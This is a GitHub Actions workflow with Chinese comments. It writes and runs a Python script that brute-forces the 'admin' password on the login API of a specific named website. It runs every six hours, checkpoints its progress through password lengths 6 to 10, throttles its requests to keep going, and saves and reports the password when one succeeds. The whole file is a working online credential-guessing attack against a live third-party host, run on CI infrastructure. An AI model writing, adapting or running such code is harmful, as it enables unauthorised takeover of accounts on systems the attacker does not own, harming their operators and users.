name: Password Brute Force Complete

on:
  workflow_dispatch:  # 允许手动触发
  schedule:
    - cron: '0 */6 * * *'  # 每6小时运行一次

jobs:
  brute-force:
    runs-on: ubuntu-latest
    timeout-minutes: 280  # 接近GitHub的6小时限制
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.9'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install requests

    - name: Create brute force script
      run: |
        cat > brute_force.py << 'EOF'
        import random
        import string
        import requests
        import json
        import time
        import os
        import itertools

        # 所有可能的字符集（字母+数字+特殊符号）
        ALL_CHARS = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
        print(f"字符集大小: {len(ALL_CHARS)}")

        # 从检查点恢复
        def get_checkpoint():
            if os.path.exists("checkpoint.txt"):
                with open("checkpoint.txt", "r") as f:
                    line = f.readline().strip()
                    if line and "|" in line:
                        parts = line.split("|")
                        if len(parts) == 2:
                            try:
                                return int(parts[0]), int(parts[1])
                            except ValueError:
                                pass
            return (6, 0)  # 默认从长度6，索引0开始

        # 保存检查点
        def save_checkpoint(length, index):
            with open("checkpoint.txt", "w") as f:
                f.write(f"{length}|{index}")

        # 尝试登录的函数
        def try_login(password):
            url = "https://zank666api.icu/proxy/api/back/back-user/login"
            
            headers = {
                "Host": "zank666api.icu",
                "Content-Type": "application/json;charset=utf-8",
                "Origin": "https://zank666api.icu",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
                "Referer": "https://zank666api.icu/",
                "Accept-Language": "zh-CN,zh-Hans;q=0.9"
            }
            
            data = {
                "password": password,
                "userName": "admin"
            }

            try:
                response = requests.post(url, headers=headers, data=json.dumps(data), timeout=15)
                
                # 记录尝试
                with open("attempt_log.txt", "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {password} - {response.status_code}\n")

                # 成功判断条件
                if response.status_code == 200:
                    success_conditions = [
                        "token" in response.text.lower(),
                        "success" in response.text.lower(),
                        "成功" in response.text,
                        '"code":200' in response.text,
                        '"success":true' in response.text
                    ]
                    if any(success_conditions):
                        print(f"✅ 登录成功! 密码是: {password}")
                        print(f"响应内容: {response.text[:200]}...")
                        with open("password.txt", "w") as f:
                            f.write(password)
                        with open("success_log.txt", "a") as f:
                            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - 成功密码: {password}\n")
                        return True
                
                return False

            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}")
                with open("error_log.txt", "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {password} - 错误: {e}\n")
                return False

        # 按索引生成特定位置的密码
        def generate_password_by_index(length, index):
            """根据索引生成指定位置的密码"""
            password = []
            n = index
            for _ in range(length):
                password.append(ALL_CHARS[n % len(ALL_CHARS)])
                n //= len(ALL_CHARS)
            return ''.join(password)

        def main():
            print("开始完整密码空间爆破...")
            print("=" * 50)
            
            # 从检查点恢复
            start_length, start_index = get_checkpoint()
            print(f"从检查点恢复: 长度={start_length}, 索引={start_index}")
            
            found = False
            total_tried = 0
            start_time = time.time()
            
            # 按长度顺序尝试
            for length in range(start_length, 11):  # 6-10位
                total_passwords = len(ALL_CHARS) ** length
                print(f"开始尝试长度 {length} 的密码，共 {total_passwords:,} 种组合")
                
                # 计算起始索引
                start_idx = start_index if length == start_length else 0
                
                for index in range(start_idx, total_passwords):
                    if found:
                        break
                        
                    password = generate_password_by_index(length, index)
                    total_tried += 1
                    
                    # 每1000次尝试显示进度
                    if total_tried % 1000 == 0:
                        elapsed = time.time() - start_time
                        rate = total_tried / elapsed if elapsed > 0 else 0
                        print(f"已尝试 {total_tried:,} 次密码，速率: {rate:.2f} 次/秒，当前: {password}")
                        save_checkpoint(length, index)
                    
                    # 尝试登录
                    if try_login(password):
                        found = True
                        break
                    
                    # 添加延迟避免请求过快
                    if total_tried % 50 == 0:
                        time.sleep(0.5)
                
                if found:
                    break
                    
                # 重置起始索引为0，以便下一个长度从开始尝试
                save_checkpoint(length + 1, 0)
                print(f"完成长度 {length} 的所有密码尝试")
            
            return found

        if __name__ == "__main__":
            start_time = time.time()
            found = main()
            end_time = time.time()
            
            print("=" * 50)
            if found:
                print(f"🎉 爆破成功!")
            else:
                print("❌ 爆破失败，未找到正确密码")
            print(f"总耗时: {end_time - start_time:.2f} 秒")
            print(f"总尝试次数: {total_tried}")
        EOF

    - name: Create necessary files
      run: |
        touch attempt_log.txt error_log.txt
        # 初始化检查点文件（如果不存在）
        if [ ! -f "checkpoint.txt" ]; then
          echo "6|0" > checkpoint.txt
        fi

    - name: Run brute force
      run: |
        echo "开始运行爆破脚本..."
        # 设置超时时间为275分钟（4小时35分钟）
        timeout 275m python brute_force.py || echo "运行完成或超时"
        echo "爆破脚本运行结束"

    - name: Check if password found
      id: check_password
      run: |
        if [ -f "password.txt" ]; then
          echo "PASSWORD_FOUND=true" >> $GITHUB_OUTPUT
          echo "密码已找到: $(cat password.txt)"
          echo "🎉 密码爆破成功! 密码: $(cat password.txt)" >> $GITHUB_STEP_SUMMARY
        else
          echo "PASSWORD_FOUND=false" >> $GITHUB_OUTPUT
          echo "本轮未找到密码"
          echo "📊 本轮运行完成，继续下一轮..." >> $GITHUB_STEP_SUMMARY
          # 显示当前检查点
          if [ -f "checkpoint.txt" ]; then
            echo "当前检查点: $(cat checkpoint.txt)" >> $GITHUB_STEP_SUMMARY
          fi
        fi

    - name: Upload results
      uses: actions/upload-artifact@v4
      with:
        name: brute-force-results
        path: |
          password.txt
          success_log.txt
          attempt_log.txt
          error_log.txt
          checkpoint.txt
        if-no-files-found: ignore

    - name: Show attempt statistics
      run: |
        if [ -f "attempt_log.txt" ]; then
          attempt_count=$(wc -l < attempt_log.txt)
          echo "本轮尝试次数: $attempt_count" >> $GITHUB_STEP_SUMMARY
          echo "最后尝试的密码:" >> $GITHUB_STEP_SUMMARY
          tail -5 attempt_log.txt >> $GITHUB_STEP_SUMMARY
        fi
        echo "运行完成时间: $(date)" >> $GITHUB_STEP_SUMMARY